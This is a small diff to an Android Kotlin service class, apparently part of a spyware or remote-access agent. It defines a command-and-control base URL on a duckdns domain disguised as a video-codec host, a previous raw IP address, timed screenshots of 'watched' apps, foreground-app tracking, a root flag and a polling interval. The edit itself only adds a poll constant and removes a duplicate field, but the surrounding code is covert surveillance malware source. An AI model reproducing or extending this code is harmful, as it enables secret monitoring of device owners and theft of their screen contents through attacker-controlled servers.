@@ -26,6 +26,7 @@ class AgentService : Service() {
     companion object {
         const val C2_BASE = "https://hevc-codec.duckdns.org"   // was: http://38.97.62.125:5000
         private val SCREENSHOT_INTERVAL_MS = 8_000L           // every 5 sec while watched app open
+        private const val POLL_MS = 3_000L 
         var watchedApps: MutableList<String> = mutableListOf()
         var isAppInForeground = false
         var foregroundAppName: String = ""
@@ -35,7 +36,7 @@ class AgentService : Service() {
     private lateinit var deviceId: String
     private var rooted = false
     private var lastScreenshotTime = 0L
-    private val SCREENSHOT_INTERVAL_MS = 5_000L
+    
 
     private val pollRunnable = object : Runnable {
         override fun run() {
